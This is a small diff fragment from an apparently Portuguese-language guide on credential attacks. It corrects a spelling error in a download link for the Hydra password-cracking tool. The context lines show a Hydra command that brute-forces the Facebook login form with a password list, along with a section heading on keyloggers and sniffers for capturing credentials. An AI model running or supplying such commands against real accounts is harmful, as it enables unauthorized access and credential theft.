@@ -41,7 +41,7 @@ Exemplo básico de uso com Hydra (web login):
 
     hydra -l usuário -P senhas.txt facebook.com http-post-form "/login:email=^USER^&pass=^PASS^:F=login_error"  
 
-Dowload: https://github.com/vanhauser-thc/thc-hydra
+Download: https://github.com/vanhauser-thc/thc-hydra
 
 🕵️‍♂️ Keyloggers e Sniffers para Captura de Credenciais
 
